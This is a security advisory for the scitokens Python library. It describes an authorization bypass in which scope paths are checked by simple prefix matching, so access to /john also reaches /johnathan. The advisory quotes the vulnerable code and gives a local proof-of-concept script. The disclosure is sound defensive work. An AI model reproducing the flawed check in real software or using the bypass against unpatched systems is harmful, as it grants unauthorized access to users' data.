# [H] SciTokens has an Authorization Bypass via Incorrect Scope Path Prefix Checking

## Summary
Severity: High
Advisory: GHSA-w8fp-g9rh-34jh
CVE: CVE-2026-32716
CWE: CWE-285
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-03-31
Source: https://github.com/advisories/GHSA-w8fp-g9rh-34jh
Type: github-advisory

## Affected
- PyPI: `scitokens` — affected >=0 <1.9.6

## Details
### Summary
The `Enforcer` incorrectly validates scope paths by using a simple prefix match (`startswith`). This allows a token with access to a specific path (e.g., `/john`) to also access sibling paths that start with the same prefix (e.g., `/johnathan`, `/johnny`), which is an **Authorization Bypass**.

### Details
**File:** `src/scitokens/scitokens.py`  
**Methods:** `_validate_scp` and `_validate_scope`

### Vulnerable Code Snippets:

**In `_validate_scp` (around line 696):**
```python
    for scope in value:
        authz, norm_path = self._check_scope(scope)
        if (self._test_authz == authz) and norm_requested_path.startswith(norm_path):
            return True
```

**In `_validate_scope` (around line 722):**
```python
    for scope in value.split(" "):
        authz, norm_path = self._check_scope(scope)
        if (self._test_authz == authz) and norm_requested_path.startswith(norm_path):
            return True
```

If `norm_path` (authorized) is `/john` and `norm_requested_path` (requested) is `/johnathan`, `startswith` returns `True`, incorrectly granting access.

### PoC
```

import scitokens
import sys

def poc_scope_bypass():
    """
    Demonstrate an Authorization Bypass vulnerability in scope path checking.
    """
    print("--- PoC: Incorrect Scope Path Checking (Authorization Bypass) ---")
    
    issuer = "https://scitokens.org/unittest"
    enforcer = scitokens.Enforcer(issuer)
    
    # Create a token with access to /john
    token = scitokens.SciToken()
    token['iss'] = issuer
    token['scope'] = "read:/john"
    
    print(f"Authorized path in scope: /john")
    
    # 1. Test access to /john/file (should be allowed)
    print(f"[1] Testing legitimate subpath: /john/file")
    if enforcer.test(token, 'read', '/john/file'):
        print("    -> Access GRANTED (Correct behavior)")
    else:
        print("    -> Access DENIED (Incorrect behavior - should have access to subpaths)")

    # 2. Test access to /johnathan (SHOULD BE DENIED)
    print(f"[2] Testing illegitimate sibling path: /johnathan")
    if enforcer.test(token, 'read', '/johnathan'):
        print("    -> [VULNERABILITY] Access GRANTED! This is an authorization bypass.")
    else:
        print("    -> Access DENIED (Correct behavior - fix is working)")

    # 3. Test access to /johnny (SHOULD BE DENIED)
    print(f"[3] Testing illegitimate sibling path: /johnny")
    if enforcer.test(token, 'read', '/johnny'):
        print("    -> [VULNERABILITY] Access GRANTED! This is an authorization bypass.")
    else:
        print("    -> Access DENIED (Correct behavior - fix is working)")

if __name__ == "__main__":
    # Ensure scitokens from src/ is available
    sys.path.insert(0, "src")
    poc_scope_bypass()

```
### Impact
This bug allows a user to access resources they are not authorized for. For example, if a system uses usernames as top-level directories in a shared storage, a user `john` might be able to read or write to the directory of user `johnathan` simply because their names share a prefix.

## References
- https://github.com/scitokens/scitokens/security/advisories/GHSA-w8fp-g9rh-34jh
- https://nvd.nist.gov/vuln/detail/CVE-2026-32716
- https://github.com/scitokens/scitokens/commit/7a237c0f642efb9e8c36ac564b745895cca83583
- https://github.com/scitokens/scitokens
- https://github.com/scitokens/scitokens/releases/tag/v1.9.6
